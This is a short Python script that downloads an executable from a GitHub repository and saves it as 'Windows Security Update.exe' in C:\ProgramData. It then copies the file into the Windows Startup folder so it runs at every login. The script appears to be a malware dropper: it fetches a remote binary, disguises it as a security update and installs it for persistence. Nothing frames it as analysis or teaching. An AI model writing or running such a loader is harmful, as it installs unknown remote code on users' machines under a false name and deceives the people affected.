import requests
import shutil
import winshell

print('Beginning file download with requests')

url = 'https://github.com/MASMob2022/pyw.download/raw/main/Windows%20Security%20Update.exe'
r = requests.get(url)

with open('C:\ProgramData\Windows Security Update.exe', 'wb') as f:
    f.write(r.content)

# Retrieve HTTP meta-data
print(r.status_code)
print(r.headers['content-type'])
print(r.encoding)

original = r'C:\ProgramData\Windows Security Update.exe'

startup = winshell.startup()+'/Windows Security Update.exe'
print(winshell.startup())

shutil.copyfile(original, startup)
